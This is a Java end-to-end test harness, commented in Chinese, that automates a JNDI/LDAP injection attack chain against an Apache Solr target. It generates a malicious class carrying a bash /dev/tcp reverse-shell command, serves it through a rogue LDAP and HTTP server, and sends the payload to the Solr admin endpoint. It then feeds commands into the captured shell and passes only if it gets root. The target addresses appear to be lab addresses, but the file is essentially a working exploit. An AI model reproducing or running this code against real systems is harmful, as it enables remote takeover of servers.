import com.sun.net.httpserver.HttpServer;

import java.io.File;
import java.net.ServerSocket;
import java.net.Socket;
import java.net.SocketTimeoutException;

/**
 * 端到端测试（需要 Java 8 靶机在线）
 *
 * 一键验证完整攻击链：生成恶意类 → 起 LDAP/HTTP 服务 → 反弹 Shell 监听 →发送 Payload → 校验 shell 输出
 *
 * 用法：java -cp classes E2ETest
 * 默认：172.18.0.2 8983 192.168.217.143
 */
public class E2ETest {

    public static void main(String[] args) throws Exception {
        String targetHost = args.length > 0 ? args[0] : "172.18.0.2";
        int targetPort = args.length > 1 ? Integer.parseInt(args[1]) : 8983;
        String attackerIp = args.length > 2 ? args[2] : "192.168.217.143";

        File work = new File("exploit_dir");
        work.mkdirs();

        // ---------- 1. 生成反弹 Shell 恶意类 ----------
        MaliciousClassGenerator.generate(
                "bash -i >& /dev/tcp/" + attackerIp + "/4444 0>&1", work.getPath());

        // ---------- 2. 起 LDAP + HTTP ----------
        ServerSocket ldap = MaliciousLDAPServer.start(
                1389, "http://" + attackerIp + ":8888/", "Exploit");
        HttpServer http = HttpFileServer.start(work.getPath(), 8888);
        Thread.sleep(500);

        // ---------- 3. 反弹 Shell 监听（带回调） ----------
        StringBuilder shellOut = new StringBuilder();
        Thread shellThread = new Thread(() -> {
            try {
                ReverseShellListener.listen(4444, conn -> probeShell(conn, shellOut));
            } catch (Exception e) {
                e.printStackTrace();
            }
        });
        shellThread.start();
        Thread.sleep(500);

        // ---------- 4. 发送 Payload 触发 ----------
        PayloadSender.send(targetHost, targetPort,
                "ldap://" + attackerIp + ":1389/cn=Exploit", "/solr/admin/cores");

        // ---------- 5. 等待 shell 输出并校验 ----------
        shellThread.join(20000);
        if (shellThread.isAlive()) {
            System.out.println("[dbg] shellThread still alive, stack:");
            for (StackTraceElement el : shellThread.getStackTrace()) {
                System.out.println("[dbg]   at " + el);
            }
        } else {
            System.out.println("[dbg] shellThread finished");
        }
        System.out.println("=" .repeat(50));
        System.out.println("REVERSE SHELL OUTPUT:");
        System.out.print(shellOut);
        System.out.println("=" .repeat(50));

        ldap.close();
        http.stop(0);
        if (shellOut.indexOf("uid=0(root)") >= 0) {
            System.out.println("[PASS] 端到端验证成功：反弹 Shell（root）已建立");
            System.exit(0);
        }
        System.out.println("[FAIL] 未捕获到 root shell 输出");
        System.exit(1);
    }

    /** 向已连接的 shell 注入命令并查看回显 */
    private static void probeShell(Socket conn, StringBuilder out) {
        try {
            Thread.sleep(1500);                       
            System.out.println("[dbg] sending commands");
            conn.getOutputStream().write(
                    "id; hostname; whoami; cat /etc/hostname\n".getBytes());
            conn.getOutputStream().flush();
            conn.setSoTimeout(4000);
            byte[] buf = new byte[4096];
            int n;
            try {
                while ((n = conn.getInputStream().read(buf)) > 0) {
                    String chunk = new String(buf, 0, n, "UTF-8");
                    out.append(chunk);
                    System.out.println("[dbg] read " + n + " bytes: "
                            + chunk.replace("\n", "\\n").replace("\r", "\\r"));
                    if (out.indexOf("uid=") >= 0 && out.indexOf("#") >= 0) {
                        break;                        // 拿到回显
                    }
                }
            } catch (SocketTimeoutException e) {
                System.out.println("[dbg] read timeout, got so far: "
                        + out.toString().replace("\n", "\\n"));
            }
            System.out.println("[dbg] sending exit");
            conn.getOutputStream().write("exit\n".getBytes());
            conn.getOutputStream().flush();
            Thread.sleep(300);
            conn.close();                             // 验证完成，主动断开
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
